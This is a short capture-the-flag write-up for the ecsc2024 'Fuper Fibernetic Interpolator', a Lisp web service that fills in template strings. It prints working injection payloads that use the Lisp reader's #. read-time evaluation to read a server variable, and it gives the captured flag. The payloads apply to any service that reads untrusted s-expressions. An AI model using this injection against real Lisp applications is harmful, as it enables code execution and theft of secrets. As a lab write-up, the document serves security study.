#lisp  
# ecsc2024 - Fuper Fibernetic Interpolator

### Description  
We are proud to announfe a new verfion of our award winning ftring interpolator! Feel free to try it out through our public beta API! It's INDEFTRUCTIBLE  
Site: [http://fuperfiberneticinterpolator.challs.open.ecsc2024.it](http://fuperfiberneticinterpolator.challs.open.ecsc2024.it/)  

### Overview  
It's a website coded in lisp that allows to submit a template string and the substitutions to make in the string.  

### Road to flag 
The flag is commented on the index page -> include it in the template string.

### Exploitation
The app accepts a valid s-expression containing a template string and some substitutions to make in it.

```lisp
(
	:template "aaa {{sas}} aaa"
	:substitutions((:sas . "*flag*")(:day . "a"))
)
```

3. [Lisp's read dynamic evaluation](https://irreal.org/blog/?p=638)
```lisp
(
	:template "{x}"
	:substitutions(
		(:x . #.(flag) )
	)
)
----
(
	:template "{x}"
	:substitutions(
		(:x . #.(intern *flag*) )
	)
)

```
These payloads return a fake flag: `ziopera`.

4. Specifying the package
```lisp
(
	:template "{x}"
	:substitutions(
		(:x . #.(intern app.web::*flag*) )
	)
)
```

`openECSC{F_3Xpr3Ff10Nf_4r3_1n_mY_n1ghtM4r3f_DB853630}`
